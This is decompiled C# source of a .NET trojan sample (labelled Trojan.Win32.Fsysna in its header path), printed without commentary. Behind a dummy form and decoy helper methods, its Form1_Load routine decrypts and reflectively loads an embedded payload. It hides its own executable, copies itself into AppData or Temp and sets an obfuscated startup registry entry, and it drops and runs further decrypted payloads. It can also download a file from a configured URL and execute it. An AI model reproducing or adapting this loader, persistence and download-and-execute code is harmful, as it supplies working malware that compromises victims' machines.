// Decompiled with JetBrains decompiler
// Type: ePsmpVfEBbD7JvU35.jMWjno977htj
// Assembly: ePsmpVfEBbD7JvU35, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 27474A61-395E-499F-B2A0-3B44D86384BA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.hmn-ffaa1242a0783eab3bbb3363971cf3911d87b6899d5365481f5a9478a551ac91.exe

using ePsmpVfEBbD7JvU35.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ePsmpVfEBbD7JvU35
{
  [DesignerGenerated]
  internal class jMWjno977htj : Form
  {
    private IContainer components;
    [AccessedThroughProperty("ComboBox1")]
    private ComboBox _ComboBox1;
    [AccessedThroughProperty("DateTimePicker1")]
    private DateTimePicker _DateTimePicker1;
    [AccessedThroughProperty("NotifyIcon1")]
    private NotifyIcon _NotifyIcon1;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("Button3")]
    private Button _Button3;
    [AccessedThroughProperty("Button4")]
    private Button _Button4;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    [AccessedThroughProperty("CheckBox2")]
    private CheckBox _CheckBox2;
    [AccessedThroughProperty("CheckBox3")]
    private CheckBox _CheckBox3;
    [AccessedThroughProperty("CheckBox4")]
    private CheckBox _CheckBox4;
    [AccessedThroughProperty("LinkLabel1")]
    private LinkLabel _LinkLabel1;
    [AccessedThroughProperty("LinkLabel2")]
    private LinkLabel _LinkLabel2;
    [AccessedThroughProperty("LinkLabel3")]
    private LinkLabel _LinkLabel3;
    [AccessedThroughProperty("LinkLabel4")]
    private LinkLabel _LinkLabel4;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("ListBox2")]
    private ListBox _ListBox2;
    [AccessedThroughProperty("ListBox3")]
    private ListBox _ListBox3;
    [AccessedThroughProperty("ListBox4")]
    private ListBox _ListBox4;

    public jMWjno977htj()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.ComboBox1 = new ComboBox();
      this.DateTimePicker1 = new DateTimePicker();
      this.NotifyIcon1 = new NotifyIcon(this.components);
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.Button3 = new Button();
      this.Button4 = new Button();
      this.CheckBox1 = new CheckBox();
      this.CheckBox2 = new CheckBox();
      this.CheckBox3 = new CheckBox();
      this.CheckBox4 = new CheckBox();
      this.LinkLabel1 = new LinkLabel();
      this.LinkLabel2 = new LinkLabel();
      this.LinkLabel3 = new LinkLabel();
      this.LinkLabel4 = new LinkLabel();
      this.ListBox1 = new ListBox();
      this.ListBox2 = new ListBox();
      this.ListBox3 = new ListBox();
      this.ListBox4 = new ListBox();
      this.SuspendLayout();
      this.ComboBox1.FormattingEnabled = true;
      ComboBox comboBox1_1 = this.ComboBox1;
      Point point1 = new Point(14, 102);
      Point point2 = point1;
      comboBox1_1.Location = point2;
      this.ComboBox1.Name = "ComboBox1";
      ComboBox comboBox1_2 = this.ComboBox1;
      Size size1 = new Size(121, 21);
      Size size2 = size1;
      comboBox1_2.Size = size2;
      this.ComboBox1.TabIndex = 0;
      DateTimePicker dateTimePicker1_1 = this.DateTimePicker1;
      point1 = new Point(37, 199);
      Point point3 = point1;
      dateTimePicker1_1.Location = point3;
      this.DateTimePicker1.Name = "DateTimePicker1";
      DateTimePicker dateTimePicker1_2 = this.DateTimePicker1;
      size1 = new Size(200, 20);
      Size size3 = size1;
      dateTimePicker1_2.Size = size3;
      this.DateTimePicker1.TabIndex = 1;
      this.NotifyIcon1.Text = "NotifyIcon1";
      this.NotifyIcon1.Visible = true;
      Button button1_1 = this.Button1;
      point1 = new Point(136, 66);
      Point point4 = point1;
      button1_1.Location = point4;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(75, 23);
      Size size4 = size1;
      button1_2.Size = size4;
      this.Button1.TabIndex = 2;
      this.Button1.Text = "Button1";
      this.Button1.UseVisualStyleBackColor = true;
      Button button2_1 = this.Button2;
      point1 = new Point(105, 120);
      Point point5 = point1;
      button2_1.Location = point5;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(75, 23);
      Size size5 = size1;
      button2_2.Size = size5;
      this.Button2.TabIndex = 3;
      this.Button2.Text = "Button2";
      this.Button2.UseVisualStyleBackColor = true;
      Button button3_1 = this.Button3;
      point1 = new Point(113, 128);
      Point point6 = point1;
      button3_1.Location = point6;
      this.Button3.Name = "Button3";
      Button button3_2 = this.Button3;
      size1 = new Size(75, 23);
      Size size6 = size1;
      button3_2.Size = size6;
      this.Button3.TabIndex = 4;
      this.Button3.Text = "Button3";
      this.Button3.UseVisualStyleBackColor = true;
      Button button4_1 = this.Button4;
      point1 = new Point(121, 136);
      Point point7 = point1;
      button4_1.Location = point7;
      this.Button4.Name = "Button4";
      Button button4_2 = this.Button4;
      size1 = new Size(75, 23);
      Size size7 = size1;
      button4_2.Size = size7;
      this.Button4.TabIndex = 5;
      this.Button4.Text = "Button4";
      this.Button4.UseVisualStyleBackColor = true;
      this.CheckBox1.AutoSize = true;
      CheckBox checkBox1_1 = this.CheckBox1;
      point1 = new Point(93, 23);
      Point point8 = point1;
      checkBox1_1.Location = point8;
      this.CheckBox1.Name = "CheckBox1";
      CheckBox checkBox1_2 = this.CheckBox1;
      size1 = new Size(81, 17);
      Size size8 = size1;
      checkBox1_2.Size = size8;
      this.CheckBox1.TabIndex = 6;
      this.CheckBox1.Text = "CheckBox1";
      this.CheckBox1.UseVisualStyleBackColor = true;
      this.CheckBox2.AutoSize = true;
      CheckBox checkBox2_1 = this.CheckBox2;
      point1 = new Point(102, 123);
      Point point9 = point1;
      checkBox2_1.Location = point9;
      this.CheckBox2.Name = "CheckBox2";
      CheckBox checkBox2_2 = this.CheckBox2;
      size1 = new Size(81, 17);
      Size size9 = size1;
      checkBox2_2.Size = size9;
      this.CheckBox2.TabIndex = 7;
      this.CheckBox2.Text = "CheckBox2";
      this.CheckBox2.UseVisualStyleBackColor = true;
      this.CheckBox3.AutoSize = true;
      CheckBox checkBox3_1 = this.CheckBox3;
      point1 = new Point(110, 131);
      Point point10 = point1;
      checkBox3_1.Location = point10;
      this.CheckBox3.Name = "CheckBox3";
      CheckBox checkBox3_2 = this.CheckBox3;
      size1 = new Size(81, 17);
      Size size10 = size1;
      checkBox3_2.Size = size10;
      this.CheckBox3.TabIndex = 8;
      this.CheckBox3.Text = "CheckBox3";
      this.CheckBox3.UseVisualStyleBackColor = true;
      this.CheckBox4.AutoSize = true;
      CheckBox checkBox4_1 = this.CheckBox4;
      point1 = new Point(118, 139);
      Point point11 = point1;
      checkBox4_1.Location = point11;
      this.CheckBox4.Name = "CheckBox4";
      CheckBox checkBox4_2 = this.CheckBox4;
      size1 = new Size(81, 17);
      Size size11 = size1;
      checkBox4_2.Size = size11;
      this.CheckBox4.TabIndex = 9;
      this.CheckBox4.Text = "CheckBox4";
      this.CheckBox4.UseVisualStyleBackColor = true;
      this.LinkLabel1.AutoSize = true;
      LinkLabel linkLabel1_1 = this.LinkLabel1;
      point1 = new Point(70, 145);
      Point point12 = point1;
      linkLabel1_1.Location = point12;
      this.LinkLabel1.Name = "LinkLabel1";
      LinkLabel linkLabel1_2 = this.LinkLabel1;
      size1 = new Size(59, 13);
      Size size12 = size1;
      linkLabel1_2.Size = size12;
      this.LinkLabel1.TabIndex = 10;
      ((Label) this.LinkLabel1).TabStop = true;
      this.LinkLabel1.Text = "LinkLabel1";
      this.LinkLabel2.AutoSize = true;
      LinkLabel linkLabel2_1 = this.LinkLabel2;
      point1 = new Point(113, 125);
      Point point13 = point1;
      linkLabel2_1.Location = point13;
      this.LinkLabel2.Name = "LinkLabel2";
      LinkLabel linkLabel2_2 = this.LinkLabel2;
      size1 = new Size(59, 13);
      Size size13 = size1;
      linkLabel2_2.Size = size13;
      this.LinkLabel2.TabIndex = 11;
      ((Label) this.LinkLabel2).TabStop = true;
      this.LinkLabel2.Text = "LinkLabel2";
      this.LinkLabel3.AutoSize = true;
      LinkLabel linkLabel3_1 = this.LinkLabel3;
      point1 = new Point(121, 133);
      Point point14 = point1;
      linkLabel3_1.Location = point14;
      this.LinkLabel3.Name = "LinkLabel3";
      LinkLabel linkLabel3_2 = this.LinkLabel3;
      size1 = new Size(59, 13);
      Size size14 = size1;
      linkLabel3_2.Size = size14;
      this.LinkLabel3.TabIndex = 12;
      ((Label) this.LinkLabel3).TabStop = true;
      this.LinkLabel3.Text = "LinkLabel3";
      this.LinkLabel4.AutoSize = true;
      LinkLabel linkLabel4_1 = this.LinkLabel4;
      point1 = new Point(129, 141);
      Point point15 = point1;
      linkLabel4_1.Location = point15;
      this.LinkLabel4.Name = "LinkLabel4";
      LinkLabel linkLabel4_2 = this.LinkLabel4;
      size1 = new Size(59, 13);
      Size size15 = size1;
      linkLabel4_2.Size = size15;
      this.LinkLabel4.TabIndex = 13;
      ((Label) this.LinkLabel4).TabStop = true;
      this.LinkLabel4.Text = "LinkLabel4";
      this.ListBox1.FormattingEnabled = true;
      ListBox listBox1_1 = this.ListBox1;
      point1 = new Point(75, 66);
      Point point16 = point1;
      listBox1_1.Location = point16;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      size1 = new Size(120, 95);
      Size size16 = size1;
      listBox1_2.Size = size16;
      this.ListBox1.TabIndex = 14;
      this.ListBox2.FormattingEnabled = true;
      ListBox listBox2_1 = this.ListBox2;
      point1 = new Point(82, 84);
      Point point17 = point1;
      listBox2_1.Location = point17;
      this.ListBox2.Name = "ListBox2";
      ListBox listBox2_2 = this.ListBox2;
      size1 = new Size(120, 95);
      Size size17 = size1;
      listBox2_2.Size = size17;
      this.ListBox2.TabIndex = 15;
      this.ListBox3.FormattingEnabled = true;
      ListBox listBox3_1 = this.ListBox3;
      point1 = new Point(90, 92);
      Point point18 = point1;
      listBox3_1.Location = point18;
      this.ListBox3.Name = "ListBox3";
      ListBox listBox3_2 = this.ListBox3;
      size1 = new Size(120, 95);
      Size size18 = size1;
      listBox3_2.Size = size18;
      this.ListBox3.TabIndex = 16;
      this.ListBox4.FormattingEnabled = true;
      ListBox listBox4_1 = this.ListBox4;
      point1 = new Point(98, 100);
      Point point19 = point1;
      listBox4_1.Location = point19;
      this.ListBox4.Name = "ListBox4";
      ListBox listBox4_2 = this.ListBox4;
      size1 = new Size(120, 95);
      Size size19 = size1;
      listBox4_2.Size = size19;
      this.ListBox4.TabIndex = 17;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(284, 262);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ListBox4);
      this.Controls.Add((Control) this.ListBox3);
      this.Controls.Add((Control) this.ListBox2);
      this.Controls.Add((Control) this.ListBox1);
      this.Controls.Add((Control) this.LinkLabel4);
      this.Controls.Add((Control) this.LinkLabel3);
      this.Controls.Add((Control) this.LinkLabel2);
      this.Controls.Add((Control) this.LinkLabel1);
      this.Controls.Add((Control) this.CheckBox4);
      this.Controls.Add((Control) this.CheckBox3);
      this.Controls.Add((Control) this.CheckBox2);
      this.Controls.Add((Control) this.CheckBox1);
      this.Controls.Add((Control) this.Button4);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.DateTimePicker1);
      this.Controls.Add((Control) this.ComboBox1);
      this.Name = "Form1";
      this.Text = "Form1";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual ComboBox ComboBox1
    {
      get => this._ComboBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ComboBox1 = value;
    }

    internal virtual DateTimePicker DateTimePicker1
    {
      get => this._DateTimePicker1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DateTimePicker1 = value;
    }

    internal virtual NotifyIcon NotifyIcon1
    {
      get => this._NotifyIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NotifyIcon1 = value;
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button1 = value;
    }

    internal virtual Button Button2
    {
      get => this._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button2 = value;
    }

    internal virtual Button Button3
    {
      get => this._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button3 = value;
    }

    internal virtual Button Button4
    {
      get => this._Button4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button4 = value;
    }

    internal virtual CheckBox CheckBox1
    {
      get => this._CheckBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox1 = value;
    }

    internal virtual CheckBox CheckBox2
    {
      get => this._CheckBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox2 = value;
    }

    internal virtual CheckBox CheckBox3
    {
      get => this._CheckBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox3 = value;
    }

    internal virtual CheckBox CheckBox4
    {
      get => this._CheckBox4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox4 = value;
    }

    internal virtual LinkLabel LinkLabel1
    {
      get => this._LinkLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._LinkLabel1 = value;
    }

    internal virtual LinkLabel LinkLabel2
    {
      get => this._LinkLabel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._LinkLabel2 = value;
    }

    internal virtual LinkLabel LinkLabel3
    {
      get => this._LinkLabel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._LinkLabel3 = value;
    }

    internal virtual LinkLabel LinkLabel4
    {
      get => this._LinkLabel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._LinkLabel4 = value;
    }

    internal virtual ListBox ListBox1
    {
      get => this._ListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox1 = value;
    }

    internal virtual ListBox ListBox2
    {
      get => this._ListBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox2 = value;
    }

    internal virtual ListBox ListBox3
    {
      get => this._ListBox3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox3 = value;
    }

    internal virtual ListBox ListBox4
    {
      get => this._ListBox4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox4 = value;
    }

    public static byte[] ObjectToByteArray(object _Object)
    {
      try
      {
        MemoryStream serializationStream = new MemoryStream();
        new BinaryFormatter().Serialize((Stream) serializationStream, RuntimeHelpers.GetObjectValue(_Object));
        return serializationStream.ToArray();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Console.WriteLine("Exception caught in process: {0}", (object) ex.ToString());
        ProjectData.ClearProjectError();
      }
      return (byte[]) null;
    }

    public string Abbreviate(string strTitle)
    {
      int Start = 1;
      string str1 = Strings.Trim(strTitle);
      string str2 = Strings.UCase(Strings.Left(str1, 1));
      while (Strings.InStr(Start, str1, " ") != 0)
      {
        Start = checked (Strings.InStr(Start, str1, " ") + 1);
        str2 += Strings.UCase(Strings.Mid(str1, Start, 1));
      }
      return str2;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void AddtoRecentDocumentList(string FileName)
    {
      if (!Conversions.ToBoolean(FileSystem.Dir(FileName)))
        ;
    }

    public object isInstalled(MSApplications App)
    {
      string str;
      switch (App)
      {
        case MSApplications.WORD:
          str = "Word.Application";
          break;
        case MSApplications.ACCESS:
          str = "Access.Application";
          break;
        case MSApplications.EXCEL:
          str = "Excel.Application";
          break;
      }
      return (object) (Registry.ClassesRoot.OpenSubKey("Word.Application") != null);
    }

    public bool CompareFiles(string FileFullPath1, string FileFullPath2)
    {
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      ASCIIEncoding asciiEncoding = new ASCIIEncoding();
      if (!File.Exists(FileFullPath1))
        throw new Exception(FileFullPath1 + " doesn't exist");
      if (!File.Exists(FileFullPath2))
        throw new Exception(FileFullPath2 + " doesn't exist");
      bool flag;
      try
      {
        FileStream fileStream1 = new FileStream(FileFullPath1, FileMode.Open);
        StreamReader streamReader1 = new StreamReader((Stream) fileStream1);
        byte[] bytes1 = asciiEncoding.GetBytes(streamReader1.ReadToEnd());
        string Left = asciiEncoding.GetString(cryptoServiceProvider.ComputeHash(bytes1));
        streamReader1.Close();
        fileStream1.Close();
        FileStream fileStream2 = new FileStream(FileFullPath2, FileMode.Open);
        StreamReader streamReader2 = new StreamReader((Stream) fileStream2);
        byte[] bytes2 = asciiEncoding.GetBytes(streamReader2.ReadToEnd());
        string Right = asciiEncoding.GetString(cryptoServiceProvider.ComputeHash(bytes2));
        flag = Operators.CompareString(Left, Right, false) == 0;
        streamReader2.Close();
        fileStream2.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        throw ex;
      }
      return flag;
    }

    private byte[] TpuklWCUDDYTfoLwraIQEbY(Stream stream)
    {
      int int32 = Convert.ToInt32(stream.Length);
      byte[] buffer = new byte[checked (int32 + 1)];
      stream.Read(buffer, 0, int32);
      stream.Close();
      return buffer;
    }

    public byte[] yjcjObaqt4(byte[] CLMKPmszer, string dugkLkvqIG)
    {
      RC2CryptoServiceProvider cryptoServiceProvider1 = new RC2CryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      byte[] numArray;
      try
      {
        byte[] hash = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(dugkLkvqIG));
        cryptoServiceProvider1.Key = hash;
        cryptoServiceProvider1.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
        byte[] inputBuffer = CLMKPmszer;
        numArray = decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return numArray;
    }

    public byte[] yjcjObaqtw(byte[] CLMKPmszer, string dugkLkvqIG)
    {
      RC2CryptoServiceProvider cryptoServiceProvider1 = new RC2CryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      byte[] numArray;
      try
      {
        byte[] hash = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(dugkLkvqIG));
        cryptoServiceProvider1.Key = hash;
        cryptoServiceProvider1.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
        byte[] inputBuffer = CLMKPmszer;
        numArray = decryptor.TransformFinalBlock(inputBuffer, 0, checked (inputBuffer.Length - 1));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return numArray;
    }

    public string kNgMkCOCzt(string eSQKcZvSqw)
    {
      string str1 = Strings.StrReverse(eSQKcZvSqw);
      string str2 = "";
      int num = Strings.Len(str1);
      int Start = 1;
      while (Start <= num)
      {
        str2 += Conversions.ToString(Strings.Chr(checked (Strings.Asc(Strings.Mid(str1, Start, 1)) - 103)));
        checked { ++Start; }
      }
      return str2;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string[] strArray = Strings.Split(Encoding.Default.GetString(this.TpuklWCUDDYTfoLwraIQEbY(this.GetType().Assembly.GetManifestResourceStream("u77R0L3b"))).Replace("\0", ""), "||");
      Thread.Sleep(Conversions.ToInteger(strArray[7]));
      Assembly.Load(this.yjcjObaqt4(ePsmpVfEBbD7JvU35.My.Resources.Resources.fpazg, "5VWOLP5TlMQpofmcw2q8vs2JHcAsqx")).GetType(this.kNgMkCOCzt("¬·ÕÜ\u00B9")).InvokeMember(this.kNgMkCOCzt("¬·ÛÊÌÑÕ°"), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[6]
      {
        (object) this.yjcjObaqtw(this.TpuklWCUDDYTfoLwraIQEbY(this.GetType().Assembly.GetManifestResourceStream("u77R0L3a")), strArray[16]),
        (object) true,
        (object) strArray[6],
        (object) this.kNgMkCOCzt("ÌßÌ•"),
        (object) true,
        (object) false
      });
      if (Operators.CompareString(strArray[5], "1", false) == 0)
      {
        try
        {
          File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden | FileAttributes.System);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(strArray[0], "1", false) == 0)
      {
        string str = Path.GetTempPath();
        if (Operators.CompareString(strArray[3], "A", false) == 0)
          str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        if (!File.Exists(str + strArray[2]))
        {
          try
          {
            Directory.CreateDirectory(str + strArray[4]);
            File.Copy(Application.ExecutablePath, str + strArray[4] + "\\" + strArray[2], true);
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(this.kNgMkCOCzt("ÕÜ\u00B9ÃÕÖÐÚÙÌ\u00BDÛÕÌÙÙÜªÃÚÞÖËÕÐ\u00BEÃÛÍÖÚÖÙÊÐ´ÃÌÙÈÞÛÍÖº"), true);
            registryKey.SetValue(strArray[1], (object) (str + strArray[4] + "\\" + strArray[2]), RegistryValueKind.String);
            registryKey.Close();
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + strArray[2]);
              MyProject.Computer.FileSystem.GetFileInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).Attributes = FileAttributes.Hidden;
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
      }
      if (Operators.CompareString(strArray[13], "1", false) == 0)
      {
        if (Operators.CompareString(strArray[15], "1", false) == 0)
        {
          if (!File.Exists(Path.GetTempPath() + strArray[14]))
          {
            File.WriteAllBytes(Path.GetTempPath() + strArray[14], this.yjcjObaqtw(this.TpuklWCUDDYTfoLwraIQEbY(this.GetType().Assembly.GetManifestResourceStream("u77R0L3c")), strArray[16]));
            Process.Start(Path.GetTempPath() + strArray[14]);
          }
        }
        else
        {
          try
          {
            File.WriteAllBytes(Path.GetTempPath() + strArray[14], this.yjcjObaqtw(this.TpuklWCUDDYTfoLwraIQEbY(this.GetType().Assembly.GetManifestResourceStream("u77R0L3c")), strArray[16]));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Process.Start(Path.GetTempPath() + strArray[14]);
        }
      }
      if (Operators.CompareString(strArray[8], "1", false) == 0)
      {
        int num = (int) MessageBox.Show(strArray[10], strArray[9], MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      if (Operators.CompareString(strArray[11], "1", false) == 0)
      {
        try
        {
          Random random = new Random();
          string str = Path.GetTempPath() + Conversions.ToString(random.Next(1111, 9999)) + this.kNgMkCOCzt("ÌßÌ•");
          MyProject.Computer.Network.DownloadFile(strArray[12], str);
          Process.Start(str);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      this.Close();
    }
  }
}
